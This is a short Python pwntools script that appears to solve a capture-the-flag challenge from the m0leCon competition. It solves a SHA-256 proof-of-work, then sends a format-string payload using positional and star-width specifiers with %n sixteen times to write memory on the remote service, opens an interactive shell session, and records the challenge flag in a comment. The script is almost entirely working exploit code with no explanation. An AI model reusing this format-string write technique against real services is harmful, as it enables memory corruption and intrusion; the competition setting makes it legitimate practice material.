#!/usr/bin/env python
from pwn import *
from hashlib import sha256

def solvepow(p, n):
    s = p.recvline()
    starting = s.split(b'with ')[1][:10].decode()
    s1 = s.split(b'in ')[-1][:n]
    i = 0
    print("Solving PoW...")
    while True:
        if sha256((starting+str(i)).encode('ascii')).hexdigest()[-n:] == s1.decode():
            print("Solved!")
            p.sendline(starting + str(i))
            break
        i += 1

# context.log_level = "debug"
context.binary = elf = ELF('chall')
# p = process(elf.path)
# gdb.attach(p, 'init-gef\npie break *0x1409')
p = remote('challs.m0lecon.it', 1907)
solvepow(p, n = 5)

for _ in xrange(16):
    p.recvuntil("summed to ")
    val = int(p.recvuntil("!", True))
    payload = "%{}c%3$*9$c%8$n".format(val)

    # payload = "%8$p"
    p.sendlineafter("\n", payload)
    # "%08x"

# p.recvuntil("input is: \n")
# x = p.recvuntil("?", True)
# print(len(x))


p.interactive()
# ptm{D1d_u_r3ad_th3_0per4t0r_m4nua1_b3f0re_l0gging_1n?}

